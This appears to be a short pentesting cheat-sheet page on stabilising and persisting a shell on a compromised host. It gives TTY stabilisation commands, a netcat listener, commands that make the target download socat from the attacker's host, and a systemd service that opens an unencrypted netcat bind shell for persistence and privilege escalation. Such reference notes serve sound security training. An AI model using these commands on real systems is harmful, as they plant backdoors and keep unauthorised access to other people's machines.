---
title: "Persistance"
---

<p style="text-align: right">_- last update 09/08/2022 -_</p>

## Presentation

Once you have a shell on a target, a first step may be to stabilise and persist your access.

Two types of shells:

* **Reverse shells** : target => hacker
* **Bind shells** : hacker => target

## Stabilize a shell

For a linux box using python.

```bash
python -c 'import pty;pty.spawn("/bin/bash")' # obtenir un shell bash stable
export TERM=xterm                             # activer les controle console
^Z                                            # mettre le shell en background
stty raw -echo; fg                            # désactiver stdout du shell hôte
```

For a windows (or linux) box using [rlwrap](https://github.com/hanslub42/rlwrap).

```bash
# utiliser readlinewrapper
rlwrap nc -lvnp <port>
```

Using socat (for linux or windows).

```bash
# on veux upload socat sur la machine cible
sudo python3 -m http.server 80      # pirate
# target (linux)
curl -o /tmp/socat <LOCAL-IP>/socat
# target (windows)
Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe
```

Sometimes, the shell has a weird size.

```bash
stty -a
stty rows <nbrows>
stty cols <nbcols>
```

## Command an Control

[Villain](https://github.com/t3l3machus/Villain) is like a very light C2.

## Systemctl

If netcat is available and the `systemctl` command can be abused (see [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/)), the following service can be installed to elevate privileges and, even, as a way to create persistance. It starts a service serving a **non encrypted** shell on the given port.

```txt
[Service]
Type=oneshot
ExecStart=/bin/sh -c "nc -lp 5555 -e /bin/bash"
[Install]
WantedBy=multi-user.target
```
